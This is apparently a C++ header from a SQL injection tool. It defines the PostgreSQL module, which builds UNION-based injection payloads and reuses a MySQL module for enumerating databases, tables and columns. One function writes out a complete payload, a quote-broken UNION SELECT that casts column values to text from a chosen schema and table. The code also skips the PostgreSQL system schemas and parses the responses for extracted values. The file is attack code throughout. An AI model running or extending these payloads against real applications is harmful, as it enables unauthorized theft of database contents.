#ifndef SQLI_POSTGRESQL
#define SQLI_POSTGRESQL

#include "sqli_mysql.hpp"

struct sqli_postgresql
{
        inline static const str_vector _excluded = {
            "pg_catalog",
            "pg_toast",
        };

        // =========================================== UNION BASED PAYLOADS
        static std::string union_based_db_payload(const sptr_vector params)
        {
                return sqli_mysql::union_based_db_payload(params);
        };

        static std::string union_based_tab_payload(const sptr_vector params)
        {
                return sqli_mysql::union_based_tab_payload(params);
        };

        static std::string union_based_col_payload(const sptr_vector params)
        {
                return sqli_mysql::union_based_col_payload(params);
        };

        static std::string union_based_val_payload(const sptr_vector params)
        {
                return "' UNION SELECT " + *params[2] + *params[1] + "::text " +
                       "FROM " + *params[3] + "." + *params[0] + "-- ";
        };

        // =========================================== UNION BASED PARSER
        static str_vector union_based_parser(const std::string& response)
        {
                return sqli_mysql ::union_based_parser(response);
        };
};
#endif
